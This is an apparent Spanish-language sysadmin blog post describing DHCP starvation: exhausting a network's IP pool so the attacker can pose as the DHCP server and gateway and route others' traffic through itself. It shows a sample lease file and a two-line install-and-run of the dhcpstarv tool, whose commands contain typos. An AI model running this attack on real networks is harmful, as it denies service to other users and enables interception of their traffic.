---
Description: "DHCP Starvation"
Keywords:
- sysadmin 
- sistemas
- dhcp
Section: 
Tags:
- dhcp
Thumbnail: https://pbs.twimg.com/media/CtVBjleWIAARyAR?format=jpg
socialImage: https://pbs.twimg.com/media/CtVBjleWIAARyAR?format=jpg
featuredImage: https://pbs.twimg.com/media/CtVBjleWIAARyAR?format=jpg
Title: DHCP Starvation
Topics:
- sysarmy
- join
- chat
markup: markdown
date: 2020-04-16
---
# Situación
Esto es básicamente agotar las direcciones IP disponibles. Pero no solo eso. El tema es que una vez agotadas las IP, nosotros podemos ser el server DHCP y ser el gateway y que todas las conexiones pasen por nosotros.

## A ver  de donde sacamos las IPs que tenemos asignadas
Si queremos ver la ip asignada, el tiempo etc

```
cat /var/lib/dhcp/dhclient.enp0s3.leases
```

```
default-duid "\000\001\000\001%\2465u\010\000'&\354\332";
lease {
  interface "enp0s3";
  fixed-address 10.1.2.46;
  option subnet-mask 255.255.0.0;
  option time-offset -10800;
  option routers 10.1.0.1;
  option dhcp-lease-time 604800;
  option dhcp-message-type 5;
  option domain-name-servers 1.1.1.1,1.0.0.1;
  option dhcp-server-identifier 10.1.0.1;
  option unknown-224 "FGT50E3U17030986";
  option dhcp-renewal-time 302400;
  option dhcp-rebinding-time 529200;
  renew 5 2020/03/06 20:04:31;
  rebind 5 2020/03/06 20:04:31;
  expire 5 2020/03/06 20:04:31;
}

lease {
  interface "enp0s3";
  fixed-address 192.168.1.106;
  server-name "TP-LINK";
  option subnet-mask 255.255.255.0;
  option dhcp-lease-time 259200;
  option routers 192.168.1.1;
  option dhcp-message-type 5;
  option dhcp-server-identifier 192.168.1.1;
  option domain-name-servers 192.168.1.1;
  option dhcp-renewal-time 129600;
  option dhcp-rebinding-time 226800;
  option host-name "dhcppc6";
  option domain-name "";
  renew 0 2020/04/05 23:42:27;
  rebind 2 2020/04/07 10:14:29;
  expire 2 2020/04/07 19:14:29;
}
```
## Jodiendo
Bueno, vamos a instalar lo que es la aplicación que va a starvear todas las direcciones IP:
```
apt-get -y instal dhcpstarv
dhcpstarb -i wlanp0s1 -v
```

Y listo, esperamos un rayo y agotamos las conexiones
Enjoy!

[ipf0rw4rd](https://twitter.com/ipf0rw4rd)

[My Blog](https://blog.ipforward.co)
